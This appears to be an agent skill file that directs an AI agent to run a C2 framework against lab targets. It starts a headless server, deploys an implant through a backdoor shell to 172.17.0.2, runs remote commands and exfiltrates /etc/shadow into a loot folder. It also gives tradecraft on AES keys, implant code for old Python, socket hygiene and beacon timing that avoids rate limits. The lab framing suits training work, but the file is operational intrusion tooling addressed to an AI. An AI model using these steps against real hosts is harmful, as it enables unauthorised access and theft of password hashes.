---
name: c2-session
description: "Operate live malleable C2 sessions against lab targets: headless server lifecycle, agent deploy, command exec, file loot, and emulation. Knows credential rotation, AES key discipline, Python 2.5 agent constraints, and fd hygiene."
trigger: /c2-session
---

# /c2-session

Run live operations through a malleable C2 session on lab targets.
Everything here is non-interactive and loop-routable except the final
attach step, which is foreground-terminal only by design.

## Lifecycle (in order)

```
c2_server start                  # headless lazyc2; idempotent, keeps creds
c2_deploy 172.17.0.2             # drop + launch agent via shell primitive
c2_exec msf-172-17-0-2 id        # issue command, wait, print answer
c2_loot 172.17.0.2 /etc/shadow   # exfiltrate to sessions/loot/ + manifest
c2_reboot                        # stop, rotate operator creds, fresh boot
c2_server stop                   # stop the headless server
```

`c2_server start` never rotates credentials (live agents stay valid).
`c2_reboot` always rotates them and re-syncs every store.

## Credentials (single source of truth)

- The RUNNING server's login lives in `.c2_credentials.txt` — rewritten
  on every managed boot. If login fails, compare it against
  `c2_server status` (`live_user`): different values mean the server was
  started outside the manager with other creds.
- Lab machine state (user, password, ports, AES snapshot) lives in
  `sessions/c2_lab.json`, never in `payload.json`.
- The shell adopts the file creds at startup. `c2_exec`/`c2_loot` read
  lab auth directly, independent of shell auth state.

## AES key discipline

The key is owned by the server (`sessions/key.aes` while running) and
snapshotted to `sessions/c2_lab.json` on boot. Tooling NEVER generates
keys: a rotated key bricks every deployed agent (garbage commands in,
HTTP 500 out). After any C2 restart, redeploy agents. Never delete key
files under a live server.

## Agent constraints (vintage targets)

- The gym runs Python 2.5 with no `ssl` module: the agent speaks plain
  HTTP (lab listener, e.g. `:8080`) and does AES via the `openssl` CLI.
- Forbidden in agent code: `timeout=` kwargs, `except...as`,
  `import json`, `os.closerange` (2.6+). Close fds 3..255 manually.
- Agents born in backdoor shells MUST drop inherited fds at startup
  (close 3..255, stdin from /dev/null) or they inherit the backdoor
  LISTEN socket and wedge the target port permanently.
- Single-shot backdoors serve effectively one shell per trigger: one
  trigger, one persistent multiplexed session, clean `exit` on close.
  Never stack connections; never abandon sessions.

## Reading answers

Command outputs land in `sessions/<client_id>.records.jsonl` (one JSON
per line: `command`, `output`, `user`, `hostname`). `wait_record`
polls it. Loot lands in `sessions/uploads/` then staged to
`sessions/loot/<name>_<client>.txt` + `manifest.jsonl`.

## Rate limits

Beacon poll/result routes are limiter-exempt (AES already
authenticates); the global 200/hour limit would otherwise 429 agents.
Poll at 25s+ regardless, with backoff on failures. The generic
error handler no longer masks HTTP codes as 500s.

## MCP equivalents

`lazyown_apt_chain` (full chain), `lazyown_atomic_shell`
(verify-only, never interactive), `lazyown_atomic_clean`
(soft default; hard needs confirm=true). The opencode bridge exposes
them as `apt_chain`, `atomic_shell`, `atomic_clean`.
